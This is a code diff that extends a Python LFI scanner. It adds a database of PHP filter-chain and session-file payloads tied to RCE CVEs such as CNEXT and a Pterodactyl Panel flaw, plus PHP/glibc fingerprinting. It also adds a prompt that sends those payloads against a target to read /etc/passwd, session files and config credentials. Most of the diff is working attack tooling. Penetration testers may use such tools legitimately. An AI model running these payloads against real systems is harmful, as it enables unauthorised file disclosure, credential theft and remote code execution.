@@ -60,33 +60,33 @@ class HTTPClient:
         self.follow_redirects = follow_redirects
         self.timeout = timeout
         self.max_retries = max_retries
-        
+
         if proxy:
             self.session.proxies = {"http": proxy, "https": proxy}
-        
+
         default_headers = {"User-Agent": user_agent}
         if headers:
             default_headers.update(headers)
         self.session.headers.update(default_headers)
-        
+
         if cookies:
             self.session.cookies.update(cookies)
-    
+
     def _request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
         kwargs.setdefault('timeout', self.timeout)
         kwargs.setdefault('allow_redirects', self.follow_redirects)
         for attempt in range(self.max_retries + 1):
             try:
                 return self.session.request(method, url, **kwargs)
-            except requests.RequestException as e:
+            except requests.RequestException:
                 if attempt == self.max_retries:
                     return None
-                time.sleep(0.5 * (2 ** attempt))  # exponential backoff
+                time.sleep(0.5 * (2 ** attempt))
         return None
-    
+
     def get(self, url: str, **kwargs) -> Optional[requests.Response]:
         return self._request('GET', url, **kwargs)
-    
+
     def post(self, url: str, data: Optional[Dict] = None, body: Optional[str] = None,
              headers: Optional[Dict] = None, **kwargs) -> Optional[requests.Response]:
         req_kwargs = {}
@@ -99,27 +99,234 @@ class HTTPClient:
         return self._request('POST', url, **req_kwargs, **kwargs)
 
 
+# ---------------------------------------------------------------------------
+# CVE MAPPER – LFI / RFI / LFI→RCE (finally...)
+# ---------------------------------------------------------------------------
+class CVEMapper:
+    """
+    Baza CVE związanych wyłącznie z LFI/RFI.
+    Każdy wpis zawiera publiczne payloady PoC (filter chains, ścieżki, itp.).
+    """
+
+    CVE_DATABASE: Dict[str, Dict] = {
+        "CVE-2024-2961": {
+            "name": "CNEXT – glibc iconv overflow via PHP filter chains",
+            "types": ["LFI", "RCE"],
+            "php_min": (7, 0, 0),
+            "php_max": (8, 3, 7),
+            "glibc_max": (2, 39),
+            "severity": "critical",
+            "description": (
+                "PHP filter chains z convert.iconv wywołują heap overflow w glibc iconv. "
+                "Pozwala na RCE bez uploadu pliku. Wymaga glibc <= 2.39 i PHP 7.0.0–8.3.7."
+            ),
+            "poc_payloads": [
+                # (Ambionics / kyotozx PoC)
+                "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|"
+                "convert.iconv.UTF8.UTF7|convert.iconv.L1.UCS-4LE/resource={PATH}",
+                "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|"
+                "convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|"
+                "convert.iconv.WINDOWS-1252.UCS2|convert.iconv.UCS2.UTF8/resource={PATH}",
+                "php://filter/convert.iconv.L1.UCS-4LE|convert.iconv.UTF8.CSISO2022KR|"
+                "convert.base64-encode|convert.iconv.UTF8.UTF7/resource={PATH}",
+                "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|"
+                "convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|"
+                "convert.iconv.UTF16LE.UTF8|convert.iconv.ISO-8859-1.UTF-8/resource={PATH}",
+            ],
+        },
+
+        "CVE-2025-49132": {
+            "name": "Pterodactyl Panel – LFI via pearcmd.php / filter chains",
+            "types": ["LFI", "RCE"],
+            "app": "pterodactyl",
+            "app_version_max": (1, 11, 11),
+            "severity": "high",
+            "description": (
+                "Pterodactyl Panel <1.11.11 – LFI do RCE poprzez pearcmd.php "
+                "(register_argc_argv=On) lub łańcuchy filtrów PHP."
+            ),
+            "poc_payloads": [
+                #  pearcmd.php (PoCs: 4nuxd / malw0re)
+                "/usr/local/lib/php/pearcmd.php",
+                "/usr/share/php/pearcmd.php",
+                "/usr/local/lib/php/pearcmd",
+                "/usr/share/php/pearcmd",
+                "/usr/local/lib/php/PEAR.php",
+                "/app/vendor/pear/pear-core-minimal/src/PEAR.php",
+                # example chain for Pterodactyl
+                "php://filter/convert.base64-encode/resource=/usr/local/lib/php/pearcmd.php",
+            ],
+        },
+
+        "CVE-2026-109618": {
+            "name": "PHP2Shell – session.upload_progress heap UAF (Chain A: session + LFI)",
+            "types": ["LFI", "RCE"],
+            "php_ranges": [
+                ((5, 4, 0), (8, 2, 34)),
+                ((8, 3, 0), (8, 3, 35)),
+                ((8, 4, 0), (8, 4, 26)),
+                ((8, 5, 0), (8, 5, 11)),
+            ],
+            "severity": "critical",
+            "description": (
+                "Heap use-after-free w session.upload_progress. Chain A: wstrzyknięcie "
+                "kodu do pliku sesji, a następnie LFI na /tmp/sess_<SID>."
+            ),
+            "poc_payloads": [
+                # PHP2SHELL (syrex1013 / segfo)
+                "php://filter/convert.base64-encode/resource=/tmp/sess_{SID}",
+                "php://filter/convert.base64-decode/resource=/tmp/sess_{SID}",
+                "/tmp/sess_{SID}",
+                "php://filter/string.rot13/resource=/tmp/sess_{SID}",
+            ],
+        },
+
+        "CVE-2026-109619": {
+            "name": "PHP2Shell – stale global state UAF (LFI chain)",
+            "types": ["LFI", "RCE"],
+            "php_ranges": [
+                ((5, 4, 0), (8, 2, 34)),
+                ((8, 3, 0), (8, 3, 35)),
+                ((8, 4, 0), (8, 4, 26)),
+                ((8, 5, 0), (8, 5, 11)),
+            ],
+            "severity": "critical",
+            "description": (
+                "Stale global state UAF. Wymaga LFI w aplikacji; łańcuch podobny do "
+                "CVE-2026-109618 (session injection + LFI)."
+            ),
+            "poc_payloads": [
+                "/tmp/sess_{SID}",
+                "php://filter/convert.base64-encode/resource=/tmp/sess_{SID}",
+                "php://filter/convert.base64-decode/resource=/tmp/sess_{SID}",
+            ],
+        },
+
+        "CVE-2026-115560": {
+            "name": "PHP2Shell – session serializer mismatch (session-file LFI)",
+            "types": ["LFI", "RCE"],
+            "php_ranges": [
+                ((5, 4, 0), (8, 2, 34)),
+                ((8, 3, 0), (8, 3, 35)),
+                ((8, 4, 0), (8, 4, 26)),
+                ((8, 5, 0), (8, 5, 11)),
+            ],
+            "severity": "critical",
+            "description": (
+                "Desynchronizacja session.serialize_handler. Upload-progress zapisuje "
+                "dane w jednym formacie, a odczyt następuje w innym. Wymaga LFI."
+            ),
+            "poc_payloads": [
+                # PoCs: sykeops / prnjlksingh
+                "/tmp/sess_{SID}",
+                "php://filter/convert.base64-encode/resource=/tmp/sess_{SID}",
+                "php://filter/convert.base64-decode/resource=/tmp/sess_{SID}",
+                "php://filter/string.strip_tags/resource=/tmp/sess_{SID}",
+            ],
+        },
+    }
+
+    @staticmethod
+    def parse_version(v) -> Optional[Tuple[int, ...]]:
+        if v is None:
+            return None
+        if isinstance(v, tuple):
+            return v
+        m = re.search(r'(\d+)\.(\d+)(?:\.(\d+))?(?:[^\d]|$)', str(v))
+        if not m:
+            return None
+        return tuple(int(x) for x in m.groups() if x is not None)
+
+    @staticmethod
+    def _pad(a: Tuple[int, ...], length: int) -> Tuple[int, ...]:
+        return tuple(a) + (0,) * (length - len(a))
+
+    @classmethod
+    def version_le(cls, a, b) -> bool:
+        a = cls.parse_version(a) if not isinstance(a, tuple) else a
+        b = cls.parse_version(b) if not isinstance(b, tuple) else b
+        if not a or not b:
+            return False
+        n = max(len(a), len(b))
+        return cls._pad(a, n) <= cls._pad(b, n)
+
+    @classmethod
+    def version_ge(cls, a, b) -> bool:
+        a = cls.parse_version(a) if not isinstance(a, tuple) else a
+        b = cls.parse_version(b) if not isinstance(b, tuple) else b
+        if not a or not b:
+            return False
+        n = max(len(a), len(b))
+        return cls._pad(a, n) >= cls._pad(b, n)
+
+    # ------------------------------------------------------------------
+    @classmethod
+    def get_relevant_cves(
+        cls,
+        php_version: Optional[str] = None,
+        glibc_version: Optional[str] = None,
+        app: Optional[str] = None,
+        app_version: Optional[str] = None,
+    ) -> List[Dict]:
+        php_v = cls.parse_version(php_version)
+        glibc_v = cls.parse_version(glibc_version)
+        app_v = cls.parse_version(app_version)
+        results: List[Dict] = []
+
+        for cve_id, info in cls.CVE_DATABASE.items():
+            applicable = False
+
+            # fixed php ranges
+            if "php_ranges" in info and php_v:
+                for lo, hi in info["php_ranges"]:
+                    if cls.version_ge(php_v, lo) and cls.version_le(php_v, hi):
+                        applicable = True
+                        break
+
+            if "php_min" in info and "php_max" in info and php_v:
+                if cls.version_ge(php_v, info["php_min"]) and cls.version_le(php_v, info["php_max"]):
+                    if "glibc_max" in info:
+                        if glibc_v:
+                            if cls.version_le(glibc_v, info["glibc_max"]):
+                                applicable = True
+                        else:
+                            applicable = "possible"  # no glibc
+                    else:
+                        applicable = True
+
+            # App
+            if "app" in info and "app_version_max" in info:
+                if app and info["app"].lower() in (app or "").lower():
+                    if app_v and cls.version_le(app_v, info["app_version_max"]):
+                        applicable = True
+
+            if applicable:
+                entry = dict(info)
+                entry["cve_id"] = cve_id
+                entry["applicable"] = applicable
+                results.append(entry)
+
+        return results
+
+
+# ---------------------------------------------------------------------------
+# RESPONSE ANALYZER (fixed I gues..)
+# ---------------------------------------------------------------------------
 class ResponseNormalizer:
-    """Normalize response content for better analysis."""
-    
     @staticmethod
     def normalize(content: str, content_type: str = '') -> str:
         if not content:
             return ''
-        # Try to decode JSON if applicable
         if 'json' in content_type.lower():
             try:
                 data = json.loads(content)
                 return json.dumps(data, indent=2)
-            except:
+            except Exception:
                 pass
-        # Unescape HTML entities
         try:
             content = html.unescape(content)
-        except:
+        except Exception:
             pass
-        # Remove excessive whitespace (but keep newlines for structure)
-        # content = re.sub(r'\s+', ' ', content)  # not always good
         return content
 
 
@@ -167,7 +374,7 @@ class ResponseAnalyzer:
         "/bin/sh": {"type": "LFI", "confidence": 0.8},
         "/usr/bin": {"type": "LFI", "confidence": 0.6},
     }
-    
+
     ERROR_PATTERNS = [
         r"Warning:\s+include\(([^)]+)\)",
         r"Warning:\s+require\(([^)]+)\)",
@@ -185,7 +392,45 @@ class ResponseAnalyzer:
         r"Warning: file_get_contents",
         r"failed to open stream: No such file or directory",
     ]
-    
+
+    PHP_VERSION_PATTERNS = [
+        re.compile(r'PHP/(\d+\.\d+(?:\.\d+)?)', re.IGNORECASE),
+        re.compile(r'PHP\s+Version\s*[<>]?\s*(\d+\.\d+(?:\.\d+)?)', re.IGNORECASE),
+        re.compile(r'PHP\s+v?(\d+\.\d+(?:\.\d+)?)', re.IGNORECASE),
+        re.compile(r'X-Powered-By:\s*PHP/(\d+\.\d+(?:\.\d+)?)', re.IGNORECASE),
+    ]
+
+    GLIBC_VERSION_PATTERNS = [
+        re.compile(r'glibc\s+(\d+\.\d+)', re.IGNORECASE),
+        re.compile(r'GNU\s+C\s+Library\s+.*?(\d+\.\d+)', re.IGNORECASE),
+        re.compile(r'GLIBC[_\s]+(\d+\.\d+)', re.IGNORECASE),
+    ]
+
+    @staticmethod
+    def extract_php_version(content: str, headers: Optional[Dict] = None) -> Optional[str]:
+        if headers:
+            for h in ("X-Powered-By", "Server"):
+                if h in headers:
+                    m = re.search(r'PHP/(\d+\.\d+(?:\.\d+)?)', headers[h], re.IGNORECASE)
+                    if m:
+                        return m.group(1)
+        if content:
+            for pat in ResponseAnalyzer.PHP_VERSION_PATTERNS:
+                m = pat.search(content)
+                if m:
+                    return m.group(1)
+        return None
+
+    @staticmethod
+    def extract_glibc_version(content: str) -> Optional[str]:
+        if not content:
+            return None
+        for pat in ResponseAnalyzer.GLIBC_VERSION_PATTERNS:
+            m = pat.search(content)
+            if m:
+                return m.group(1)
+        return None
+
     @staticmethod
     def extract_path_from_error(content: str) -> Optional[str]:
         for pattern in ResponseAnalyzer.ERROR_PATTERNS:
@@ -194,7 +439,7 @@ class ResponseAnalyzer:
                 path = match.group(1) if match.lastindex else match.group(0)
                 return path.strip()
         return None
-    
+
     @staticmethod
     def extract_content_snippet(content: str, max_lines: int = 3, max_chars: int = 150) -> Optional[str]:
         if not content:
@@ -228,7 +473,7 @@ class ResponseAnalyzer:
             if clean_line and len(clean_line) > 10:
                 return clean_line[:max_chars]
         return None
-    
+
     @staticmethod
     def analyze_base64_content(content: str) -> Tuple[Optional[str], Optional[str]]:
         try:
@@ -239,7 +484,7 @@ class ResponseAnalyzer:
                     for pattern, info in ResponseAnalyzer.INDICATORS.items():
                         if pattern in decoded:
                             return f"{info['type']}(base64)", decoded
-                except:
+                except Exception:
                     pass
             b64_pattern = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', content)
             for match in b64_pattern:
@@ -248,12 +493,12 @@ class ResponseAnalyzer:
                     for pattern, info in ResponseAnalyzer.INDICATORS.items():
                         if pattern in decoded:
                             return f"{info['type']}(base64)", decoded
-                except:
+                except Exception:
                     continue
-        except:
+        except Exception:
             pass
         return None, None
-    
+
     @staticmethod
     def analyze_php_errors(content: str) -> Dict:
         errors = {}
@@ -268,18 +513,18 @@ class ResponseAnalyzer:
         if doc_match:
             errors['possible_doc_root'] = doc_match.group(1)
         return errors
-    
+
     @staticmethod
     def detect_unix_passwd_format(content: str) -> Tuple[bool, List[str]]:
         lines = content.split('\n')
         found = []
         patterns = [
-            r'^[a-z_][a-z0-9_-]*:[x*!]:\d+:\d+:',     # passwd with x or * or !
-            r'^[a-z_][a-z0-9_-]*:\$[0-9]\$[a-zA-Z0-9./]+\$:',  # shadow hash
-            r'^[a-z_][a-z0-9_-]*:!?:\d+:\d+:',        # shadow
-            r'^[a-z_][a-z0-9_-]*:x:\d+:\d+:',          # explicit x
-            r'^[a-z_][a-z0-9_-]*:\*:\d+:\d+:',         # BSD
-            r'^[a-z_][a-z0-9_-]*:[x*!]:\d+:',          # group
+            r'^[a-z_][a-z0-9_-]*:[x*!]:\d+:\d+:',
+            r'^[a-z_][a-z0-9_-]*:\$[0-9]\$[a-zA-Z0-9./]+\$:',
+            r'^[a-z_][a-z0-9_-]*:!?:\d+:\d+:',
+            r'^[a-z_][a-z0-9_-]*:x:\d+:\d+:',
+            r'^[a-z_][a-z0-9_-]*:\*:\d+:\d+:',
+            r'^[a-z_][a-z0-9_-]*:[x*!]:\d+:',
         ]
         for line in lines:
             line = line.strip()
@@ -290,7 +535,7 @@ class ResponseAnalyzer:
             if len(found) >= 5:
                 break
         return len(found) > 0, found
-    
+
     @staticmethod
     def detect_php_defines(content: str) -> Tuple[bool, Dict]:
         defines = {}
@@ -308,33 +553,22 @@ class ResponseAnalyzer:
                     key, val = "password", match
                 defines[key] = val
         return len(defines) > 0, defines
-    
+
     @staticmethod
     def combine_confidence(indicators: List[Dict]) -> float:
-        """
-        Combine multiple indicator confidences using log-odds (Bayesian) fusion.
-        Assumes independence; gives more weight to multiple corroborating signals.
-        """
         if not indicators:
             return 0.0
-        # Use log-odds: log(p/(1-p))
         log_odds = 0.0
         for ind in indicators:
             conf = ind.get('confidence', 0.5)
-            # Clamp to avoid numerical issues
             conf = max(0.01, min(0.99, conf))
-            # Convert to log-odds
             lo = math.log(conf / (1 - conf))
             log_odds += lo
-        # Convert back to probability
         combined = 1 / (1 + math.exp(-log_odds))
         return min(0.999, combined)
-    
+
     @staticmethod
     def analyze(content: str, response_headers: Dict = None, baseline: Dict = None) -> Dict:
-        """
-        Enhanced analysis with baseline comparison and normalized content.
-        """
         result = {
             'vulnerability_type': None,
             'confidence': 0.0,
@@ -345,19 +579,16 @@ class ResponseAnalyzer:
         }
         if not content:
             return result
-        
-        # Normalize content
+
         content_type = response_headers.get('Content-Type', '') if response_headers else ''
         normalized = ResponseNormalizer.normalize(content, content_type)
-        
-        # Collect indicators
+
         indicators = []
         for pattern, info in ResponseAnalyzer.INDICATORS.items():
             if pattern in normalized:
                 indicators.append({'pattern': pattern, 'type': info['type'], 'confidence': info['confidence']})
                 result['indicators_found'].append({'pattern': pattern, 'type': info['type'], 'confidence': info['confidence']})
-        
-        # Unix passwd format
+
         is_passwd, passwd_lines = ResponseAnalyzer.detect_unix_passwd_format(normalized)
         if is_passwd:
             indicators.append({'pattern': 'unix_passwd_format', 'type': 'LFI', 'confidence': 0.95})
@@ -365,8 +596,7 @@ class ResponseAnalyzer:
             result['details']['passwd_lines'] = passwd_lines[:3]
             if not result['content_snippet']:
                 result['content_snippet'] = ' | '.join(passwd_lines[:2])
-        
-        # PHP defines
+
         has_defines, defines = ResponseAnalyzer.detect_php_defines(normalized)
         if has_defines:
             indicators.append({'pattern': 'php_config_defines', 'type': 'LFI', 'confidence': 0.9})
@@ -374,8 +604,7 @@ class ResponseAnalyzer:
             result['details']['php_defines'] = defines
             if not result['content_snippet']:
                 result['content_snippet'] = ', '.join([f"{k}={v}" for k, v in list(defines.items())[:2]])
-        
-        # Base64
+
         vuln_type, decoded = ResponseAnalyzer.analyze_base64_content(normalized)
         if vuln_type:
             indicators.append({'pattern': 'base64_decoded', 'type': vuln_type, 'confidence': 0.8})
@@ -383,47 +612,40 @@ class ResponseAnalyzer:
             result['details']['base64_decoded'] = decoded[:500]
             if not result['content_snippet']:
                 result['content_snippet'] = ResponseAnalyzer.extract_content_snippet(decoded)
-        
-        # PHP errors (path disclosure)
+
         php_errors = ResponseAnalyzer.analyze_php_errors(normalized)
         if php_errors:
             result['details']['php_errors'] = php_errors
             if 'exposed_path' in php_errors:
                 indicators.append({'pattern': 'path_disclosure', 'type': 'PATH_DISCLOSURE', 'confidence': 0.85})
                 result['indicators_found'].append({'pattern': 'path_disclosure', 'type': 'PATH_DISCLOSURE', 'confidence': 0.85})
-        
-        # Baseline deviation
+
         if baseline:
             baseline_len = baseline.get('length', 0)
             current_len = len(normalized)
             if baseline_len > 0:
-                # Significant length change (>20%) indicates possible inclusion
                 ratio = current_len / baseline_len
                 if ratio > 1.2 or ratio < 0.8:
                     result['is_baseline_deviation'] = True
                     indicators.append({'pattern': 'length_deviation', 'type': 'LFI', 'confidence': 0.6})
                     result['indicators_found'].append({'pattern': 'length_deviation', 'type': 'LFI', 'confidence': 0.6})
-        
-        # Combine confidences
+
         if indicators:
             combined_conf = ResponseAnalyzer.combine_confidence(indicators)
             result['confidence'] = combined_conf
-            # Determine primary type from highest confidence indicator
             if indicators:
                 primary = max(indicators, key=lambda x: x['confidence'])
                 result['vulnerability_type'] = primary['type']
-        
-        # Fallback snippet
+
         if not result['content_snippet']:
             result['content_snippet'] = ResponseAnalyzer.extract_content_snippet(normalized)
-        
-        # Interesting headers
+
         if response_headers:
             result['details']['interesting_headers'] = {}
             for header in ['Server', 'X-Powered-By', 'Set-Cookie']:
                 if header in response_headers:
                     result['details']['interesting_headers'][header] = response_headers[header]
-        
+
         return result
 
 
@@ -457,12 +679,14 @@ class PayloadGenerator:
     COMMON_EXTENSIONS = [ ".php", ".html", ".inc", ".jpg", ".jpeg", ".png", ".gif", ".txt", ".xml", ".json", ".pdf", ".doc", ".tmp", ".bak", ".php5", ".phtml", ".phar", ".shtml", ".asp", ".aspx" ]
     
     def __init__(self, custom_files: Optional[List[str]] = None, target_dir: Optional[str] = None,
-                 intensity: str = "normal", smart_mode: bool = False, doc_root: Optional[str] = None):
+                 intensity: str = "normal", smart_mode: bool = False, doc_root: Optional[str] = None,
+                 cve_payloads: Optional[List[str]] = None):
         self.custom_files = custom_files
         self.target_dir = target_dir
         self.intensity = intensity
         self.smart_mode = smart_mode
         self.doc_root = doc_root
+        self.cve_payloads = cve_payloads or []
     
     def generate_path_variants(self, file_path: str) -> List[str]:
         variants = set()
@@ -658,6 +882,10 @@ class PayloadGenerator:
         return list(payloads)
     
     def generate(self) -> Generator[str, None, None]:
+        # CVEs handling
+        for p in self.cve_payloads:
+            yield p
+
         file_targets = self.custom_files if self.custom_files else self.FILE_TARGETS
         if self.target_dir:
             file_targets = [self.target_dir] + list(file_targets)
@@ -756,6 +984,9 @@ class LFIScanner:
         self.discovered_paths = set()
         self.doc_root = None
         self.baseline = None
+        self.detected_php_version: Optional[str] = None
+        self.detected_glibc_version: Optional[str] = None
+        self.cve_payloads: List[str] = []
         signal.signal(signal.SIGINT, self._handle_stop)
     
     def _handle_stop(self, *_):
@@ -771,7 +1002,11 @@ class LFIScanner:
             return
         try:
             results = {'scan_info': {'total_tested': self.tested, 'duration': time.time() - self.start_time,
-                                     'findings_count': len(self.findings)}, 'findings': []}
+                                     'findings_count': len(self.findings),
+                                     'detected_php_version': self.detected_php_version,
+                                     'detected_glibc_version': self.detected_glibc_version,
+                                     'cve_payloads_used': len(self.cve_payloads)},
+                       'findings': []}
             for finding in self.findings:
                 results['findings'].append({
                     'type': finding.vuln_type,
@@ -789,7 +1024,6 @@ class LFIScanner:
             print(f"\n\033[91m[!] Failed to save results: {str(e)}\033[0m")
     
     def establish_baseline(self, url: str, param: str):
-        """Send a request for a nonexistent file to establish baseline response."""
         dummy_payload = "../../../../../../../../nonexistent_file_xyz_123"
         safe = urllib.parse.quote(dummy_payload)
         if self.method == "GET":
@@ -810,12 +1044,47 @@ class LFIScanner:
                 'status_code': resp.status_code,
                 'length': len(resp.text),
                 'headers': dict(resp.headers),
-                'content': resp.text[:500]  # store snippet for debugging
+                'content': resp.text[:500]
             }
             if self.verbose:
                 print(f"\033[90m[*] Baseline established: status={resp.status_code}, length={len(resp.text)}\033[0m")
         else:
             self.baseline = {'status_code': 0, 'length': 0, 'headers': {}, 'content': ''}
+    
+    def fingerprint_php(self, url: str, param: str):
+        """Wykrywa wersję PHP i (jeśli to możliwe) glibc."""
+        if self.verbose:
+            print("\033[96m[*] Fingerprinting PHP...\033[0m")
+        safe_payload = "php://filter/convert.base64-encode/resource=/etc/passwd"
+        full_url = self._build_url(url, param, safe_payload)
+        resp = None
+        if self.method == "GET":
+            resp = self.client.get(full_url)
+        else:
+            body = self._build_body(param, safe_payload)
+            resp = self.client.post(url, body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+        if resp:
+            self.detected_php_version = ResponseAnalyzer.extract_php_version(resp.text, dict(resp.headers))
+            self.detected_glibc_version = ResponseAnalyzer.extract_glibc_version(resp.text)
+        if self.verbose:
+            if self.detected_php_version:
+                print(f"\033[94m[*] Detected PHP version: {self.detected_php_version}\033[0m")
+            if self.detected_glibc_version:
+                print(f"\033[94m[*] Detected glibc version: {self.detected_glibc_version}\033[0m")
+            if not self.detected_php_version:
+                print("\033[93m[!] Could not fingerprint PHP version.\033[0m")
+    
+    def _build_url(self, base_url: str, param: str, payload: str) -> str:
+        parsed = urlparse(base_url)
+        query_params = parse_qs(parsed.query)
+        query_params[param] = [urllib.parse.quote(payload, safe='%')]
+        new_query = "&".join([f"{k}={v[0]}" for k, v in query_params.items()])
+        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
+    
+    def _build_body(self, param: str, payload: str) -> str:
+        body_data = self.post_data.copy()
+        body_data[param] = payload
+        return "&".join([f"{k}={v}" for k, v in body_data.items()])
     
     def scan_payload(self, url: str, param: str, payload: str, candidate_list: List[Finding]):
         if self.stop:
@@ -823,16 +1092,10 @@ class LFIScanner:
         try:
             safe_payload = urllib.parse.quote(payload, safe='%')
             if self.method == "GET":
-                parsed = urlparse(url)
-                query_params = parse_qs(parsed.query)
-                query_params[param] = [safe_payload]
-                new_query = "&".join([f"{k}={v[0]}" for k, v in query_params.items()])
-                full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
+                full_url = self._build_url(url, param, safe_payload)
                 response = self.client.get(full_url)
             else:
-                body_data = self.post_data.copy()
-                body_data[param] = safe_payload
-                body = "&".join([f"{k}={v}" for k, v in body_data.items()])
+                body = self._build_body(param, safe_payload)
                 full_url = url
                 response = self.client.post(url, body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
             
@@ -844,7 +1107,6 @@ class LFIScanner:
             
             analysis = ResponseAnalyzer.analyze(response.text, dict(response.headers), self.baseline)
             
-            # Smart mode: update discovered paths
             if self.smart_mode and analysis['details'].get('php_errors'):
                 path = analysis['details']['php_errors'].get('exposed_path')
                 if path and path not in self.discovered_paths:
@@ -853,12 +1115,10 @@ class LFIScanner:
                         self.doc_root = analysis['details']['php_errors']['possible_doc_root']
                         print(f"\n\033[94m[*] Possible document root: {self.doc_root}\033[0m")
             
-            # Verbose output for potential hits
             if self.verbose and analysis['confidence'] > 0.3:
                 snippet_info = f"\033[90m | Content: {analysis['content_snippet']}\033[0m" if analysis.get('content_snippet') else ""
                 print(f"\n\033[90m[*] {payload[:60]} | {response.status_code} | {analysis['vulnerability_type']} | {analysis['confidence']:.2f}{snippet_info}\033[0m")
             
-            # If confidence above threshold, add to candidate list (not final yet)
             if analysis['vulnerability_type'] and analysis['confidence'] > 0.5:
                 with self.lock:
                     finding = Finding(
@@ -877,73 +1137,56 @@ class LFIScanner:
         time.sleep(self.delay)
     
     def verify_candidates(self, url: str, param: str, candidates: List[Finding]) -> List[Finding]:
-        """Verify each candidate by sending additional payloads for the same target file."""
         if self.no_validation:
             return candidates
         verified = []
 
         for cand in candidates:
-
             target = None
             for known in PayloadGenerator.FILE_TARGETS:
                 if known in cand.payload:
                     target = known
                     break
             if not target:
-                # If not found, use the payload itself as target (just in case)
-                target = cand.payload[:50]  # fallback
+                target = cand.payload[:50]
             
-            # Generate verification payloads: different traversal depths/encodings for same target
             verif_payloads = []
             if target:
-                # Use a subset of path variants and null byte variants
                 pg = PayloadGenerator(custom_files=[target], intensity=self.intensity)
-                # Generate a few variants (limit to 10 to avoid flooding)
                 for pl in pg.generate():
-                    if pl not in [cand.payload]:  # avoid duplicate of the original
+                    if pl not in [cand.payload]:
                         verif_payloads.append(pl)
                         if len(verif_payloads) >= 10:
                             break
             
-            # If no specific target, just use the original payload with different encodings
             if not verif_payloads:
-                # Try to generate some variations of the payload itself
                 orig = cand.payload
                 for enc in ['', urllib.parse.quote(orig, safe='%'), urllib.parse.quote(urllib.parse.quote(orig, safe='%'), safe='%')]:
                     if enc and enc != orig:
                         verif_payloads.append(enc)
-                # Add some null byte variations
                 for null in ['%00', '\x00', '%2500']:
                     verif_payloads.append(orig + null)
             
-            # Send verification payloads and count successes
             success_count = 0
-            for vp in verif_payloads[:5]:  # limit to 5 verification attempts per candidate
+            for vp in verif_payloads[:5]:
                 if self.stop:
                     break
                 try:
                     safe_vp = urllib.parse.quote(vp, safe='%')
                     if self.method == "GET":
-                        parsed = urlparse(url)
-                        query_params = parse_qs(parsed.query)
-                        query_params[param] = [safe_vp]
-                        new_query = "&".join([f"{k}={v[0]}" for k, v in query_params.items()])
-                        full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
+                        full_url = self._build_url(url, param, safe_vp)
                         resp = self.client.get(full_url)
                     else:
-                        body_data = self.post_data.copy()
-                        body_data[param] = safe_vp
-                        body = "&".join([f"{k}={v}" for k, v in body_data.items()])
+                        body = self._build_body(param, safe_vp)
                         resp = self.client.post(url, body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
                     if resp:
                         analysis = ResponseAnalyzer.analyze(resp.text, dict(resp.headers), self.baseline)
                         if analysis['vulnerability_type'] and analysis['confidence'] > 0.5:
                             success_count += 1
-                except:
+                except Exception:
                     pass
                 time.sleep(self.delay * 0.5)
             
-            # if at least 2 out of 5 verification attempts succeed, consider it verified
             if success_count >= 2:
                 cand.verified = True
                 verified.append(cand)
@@ -966,18 +1209,45 @@ class LFIScanner:
             print(f"\033[96m[*] Custom files: {len(self.target_files)}\033[0m")
         print()
         
-        # pls work this time
         print("\033[96m[*] Establishing baseline...\033[0m")
         self.establish_baseline(url, param)
         if not self.baseline:
             print("\033[91m[!] Failed to establish baseline. Continuing anyway.\033[0m")
+        
+        # fingerprinting
+        self.fingerprint_php(url, param)
+        if self.detected_php_version:
+            relevant = CVEMapper.get_relevant_cves(
+                php_version=self.detected_php_version,
+                glibc_version=self.detected_glibc_version,
+            )
+            if relevant:
+                print("\n\033[93m[!] This PHP version seems to be vulnerable to the following CVEs:\033[0m")
+                for cve in relevant:
+                    print(f"    - \033[91m{cve['cve_id']}\033[0m: {cve['name']}  ({cve['severity']})")
+                answer = input("\n\033[96m[?] Run payloads based on public PoCs for detected vulnerabilities? [Y/n]: \033[0m").strip().lower()
+                if answer in ("", "y", "yes", "t", "tak"):
+                    for cve in relevant:
+                        for poc in cve.get("poc_payloads", []):
+                            # set {PATH} to /etc/passwd (default but useful)
+                            if "{PATH}" in poc:
+                                self.cve_payloads.append(poc.replace("{PATH}", "/etc/passwd"))
+                            else:
+                                self.cve_payloads.append(poc)
+                    print(f"\033[92m[+] Loaded {len(self.cve_payloads)} CVE-based payload(s).\033[0m")
+                else:
+                    print("\033[93m[!] Skipping CVE payloads.\033[0m")
+            else:
+                if self.verbose:
+                    print("\033[90m[*] No matching CVE found for detected PHP version.\033[0m")
         
         payload_generator = PayloadGenerator(
             custom_files=self.target_files,
             target_dir=self.target_dir,
             intensity=self.intensity,
             smart_mode=self.smart_mode,
-            doc_root=self.doc_root
+            doc_root=self.doc_root,
+            cve_payloads=self.cve_payloads,
         )
         seen = set()
         payloads = []
@@ -989,7 +1259,6 @@ class LFIScanner:
                     break
         print(f"\033[96m[*] Generated {len(payloads)} unique payloads\033[0m\n")
         
-        # 1st pass: collect candidates
         candidates: List[Finding] = []
         animator = ProgressAnimator(self)
         animator.start()
@@ -1012,14 +1281,12 @@ class LFIScanner:
             self.save_results()
             return
         
-        # report initial suspect
         print(f"\033[96m[*] Found {len(candidates)} candidate(s) with confidence > 0.5\033[0m")
         if not candidates:
             print("\033[91m[-] No candidates found. Exiting.\033[0m")
             self.save_results()
             return
         
-        # 2nd pass: verify candidates
         if not self.no_validation:
             print("\033[96m[*] Starting verification phase...\033[0m")
             verified_findings = self.verify_candidates(url, param, candidates)
@@ -1036,6 +1303,12 @@ class LFIScanner:
         print("\n\033[95m=== SUMMARY ===\033[0m")
         print(f"Total tested: {self.tested}")
         print(f"Findings: {len(self.findings)}")
+        if self.detected_php_version:
+            print(f"Detected PHP: {self.detected_php_version}")
+        if self.detected_glibc_version:
+            print(f"Detected glibc: {self.detected_glibc_version}")
+        if self.cve_payloads:
+            print(f"CVE payloads used: {len(self.cve_payloads)}")
         if self.findings:
             for f in self.findings:
